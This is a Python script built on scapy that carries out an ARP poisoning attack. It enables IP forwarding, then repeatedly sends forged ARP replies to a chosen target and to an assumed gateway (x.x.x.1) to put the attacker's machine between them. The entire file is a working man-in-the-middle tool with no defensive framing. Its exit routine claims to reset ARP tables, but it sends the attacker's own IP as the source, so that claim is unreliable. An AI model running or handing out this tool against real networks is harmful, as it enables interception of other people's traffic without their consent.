import os, time, re, subprocess, optparse
import scapy.all as scp

def get_interface_ip(interface):
    ifconfig = subprocess.check_output(["ifconfig", interface])
    ip_address = re.search(r"([0-9]{1,3}\.){3}[0-9]{1,3}", str(ifconfig))
    
    return ip_address.group(0)

def arp_posioning(target_ip, source_ip,count=1):

    #get MAC address of target
    combined_target_pack = scp.Ether(dst="ff:ff:ff:ff:ff:ff") / scp.ARP(pdst=target_ip)
    answered_list = scp.srp(combined_target_pack, timeout=5, verbose=False)[0]
    target_mac = answered_list[0][1].hwsrc

    #We are sending Gratuitous ARP (ARP response without request)
    # op=1 arprequest / op=2 arpresponse
    arp_response = scp.ARP(op=2, pdst=target_ip, hwdst=target_mac,psrc=source_ip)
    scp.send(arp_response, verbose=False, count=count)

if __name__ == "__main__":
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    try:
        number = 1

        parser = optparse.OptionParser()
        parser.add_option("-i","--interface", help="Interface that you use such as (wlan0, eth0)",dest="interface", default="wlan0")
        parser.add_option("-t","--target",help="Your target's IP", dest="target_ip")
        args = parser.parse_args()[0]

        interface_ip = get_interface_ip(args.interface)
        
        split_ip = interface_ip.split(".")
        modem_ip = ""
        for i in range(3):
            modem_ip += split_ip[i] + "."        
        modem_ip += "1"

        while True:
            arp_posioning(modem_ip,args.target_ip)
            arp_posioning(args.target_ip,modem_ip)

            print(f"\rSent {number} packets to {args.target_ip}",end="")

            number += 1
            time.sleep(.3)
            
    except KeyboardInterrupt:
        print("\nARP poisoning attack stopped. ARP tables are reset")
        
        arp_posioning(modem_ip,interface_ip, count=5)
        arp_posioning(args.target_ip, interface_ip, count=5)